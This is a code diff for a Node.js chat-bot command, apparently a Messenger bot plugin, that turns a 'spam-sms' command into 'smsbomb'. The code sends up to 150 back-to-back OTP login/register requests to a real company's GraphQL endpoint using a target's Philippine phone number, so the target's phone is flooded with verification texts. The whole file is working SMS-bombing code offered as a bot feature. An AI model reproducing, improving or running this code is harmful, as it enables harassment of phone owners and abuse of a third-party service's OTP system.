@@ -1,99 +1,95 @@
 const axios = require('axios');
 
 module.exports["config"] = {
-  name: "spam-sms",
-  version: "1.0.0",
-  role: 0,
-  credits: "shiki",
-  info: "Spam SMS messages",
-  commandCategory: "Spam",
-  cd: 2,
+    name: "smsbomb",
+    aliases: ["smsspam", "spamsms", "smsb"],
+    isPrefix: false,
+    version: "1.2.0",
+    credits: "Kenneth Panio",
+    role: 0,
+    type: "utility",
+    info: "Loop sending random OTP requests to a specified PH number, up to a limit of 150 requests.",
+    usage: "[number] [times]",
+    guide: "smsbomb 09123456789 5",
+    cd: 10,
 };
 
-function formatNumber(number) {
-  if (number.startsWith('0')) {
-    return `+63${number.slice(1)}`;
-  } else if (number.startsWith('63')) {
-    return `+${number}`;
-  } else {
-    return number;
-  }
-}
+module.exports["run"] = async ({ chat, args, font, global }) => {
+    const mono = (txt) => font.monospace(txt);
 
-async function otp(number) {
-  const formattedNumber = formatNumber(number);
-  const url = "https://graphql.toktok.ph:2096/auth/graphql/";
-  const headers = {
-    'accept': '*/*',
-    'authorization': '',
-    'Content-Type': 'application/json',
-    'Host': 'graphql.toktok.ph:2096',
-    'Connection': 'Keep-Alive',
-    'Accept-Encoding': 'gzip',
-    'User-Agent': 'okhttp/4.9.1'
-  };
-  const body = {
-    "operationName": "loginRegister",
-    "variables": {
-      "input": {
-        "mobile": formattedNumber,
-        "appFlavor": "C"
-      }
-    },
-    "query": "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"
-  };
-
-  try {
-    const response = await axios.post(url, body, { headers });
-    if (response.data.data.loginRegister === "REGISTER") {
-      return true;
-    } else {
-      return false;
-    }
-  } catch (error) {
-    console.error('Error sending OTP:', error.message);
-    return false;
-  }
-}
-
-module.exports["run"] = async ({ api, event, args }) => {
-  try {
-    if (args.length !== 3) {
-      api.sendMessage('[ SMSBomb ] Invalid arguments. Usage: smsbomb [number] [amount] [sleep]', event.threadID);
-      return;
+    if (args.length < 1) {
+        return chat.reply(mono("❗ Usage: smsbomb [number] [times]"));
     }
 
-    const number = args[0];
-    const amount = parseInt(args[1]);
-    const sleep = parseInt(args[2]);
+    let number = args[0];
+    const times = parseInt(args[1]) || 150;
 
-    if (isNaN(amount) || isNaN(sleep) || amount <= 0 || sleep <= 0) {
-      api.sendMessage('[ SMSBomb ] Invalid amount or sleep time. Please provide valid positive numbers.', event.threadID);
-      return;
+    if (isNaN(times) || times < 1 || times > 150) {
+        return chat.reply(mono("❗ Invalid number of times. It must be a positive integer, up to 150."));
     }
+
+    if (number.startsWith("+63")) {
+        number = number.slice(3);
+    } else if (number.startsWith("63")) {
+        number = number.slice(2);
+    } else if (number.startsWith("0")) {
+        number = number.slice(1);
+    }
+
+    if (!/^\d{10}$/.test(number)) {
+        return chat.reply(mono("❗ Invalid PH phone number. Must be 10-12 digits starting with 09."));
+    }
+
+    const formatNumber = (num) => `+63${num}`;
+
+    const sendOtp = async (formattedNumber) => {
+        const url = "https://graphql.toktok.ph:2096/auth/graphql/";
+        const headers = {
+            'accept': '*/*',
+            'authorization': '',
+            'Content-Type': 'application/json',
+            'Host': 'graphql.toktok.ph:2096',
+            'Connection': 'Keep-Alive',
+            'Accept-Encoding': 'gzip',
+            'User-Agent': 'okhttp/4.9.1'
+        };
+        const body = {
+            "operationName": "loginRegister",
+            "variables": {
+                "input": {
+                    "mobile": formattedNumber,
+                    "appFlavor": "C"
+                }
+            },
+            "query": "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"
+        };
+
+        try {
+            const response = await axios.post(url, body, { headers });
+            return response.data.data.loginRegister === "REGISTER";
+        } catch (error) {
+            console.error('Error sending OTP:', error.message);
+            return false;
+        }
+    };
+
+    const sending = await chat.reply(mono("📨 Start BOMBING SMS..."));
 
     let successCount = 0;
-    let failureCount = 0;
+    let failCount = 0;
 
-    console.log(`[ SMSBomb ] Bombing to: ${number}`);
-    for (let i = 0; i < amount; i++) {
-      const result = await otp(number);
-      if (result) {
-        successCount++;
-      } else {
-        failureCount++;
-      }
-      console.log(`[ SMSBomb ] Message ${i + 1}: Success - ${result}`);
-      await new Promise(resolve => setTimeout(resolve, sleep * 1000));
+    try {
+        for (let i = 0; i < times; i++) {
+            const result = await sendOtp(formatNumber(number));
+            if (result) {
+                successCount++;
+            } else {
+                failCount++;
+            }
+        }
+
+        await chat.reply(mono(`✅ SMS BOMB complete! Sent: ${successCount} success, ${failCount} failed.`));
+    } catch (error) {
+        return sending.edit(mono("❌ ERROR: " + error.message));
     }
-
-    api.sendMessage(`[ SMSBomb 💣 ] Successfully bombed ${successCount} times to ${number}. Failed attempts: ${failureCount}`, event.threadID);
-  } catch (error) {
-    console.error('[ SMSBomb ] Error:', error);
-    api.sendMessage('[ SMSBomb ] Error: ' + error.message, event.threadID);
-  }
 };
-
-process.on('unhandledRejection', (error) => {
-  console.error('Unhandled Promise Rejection:', error);
-});
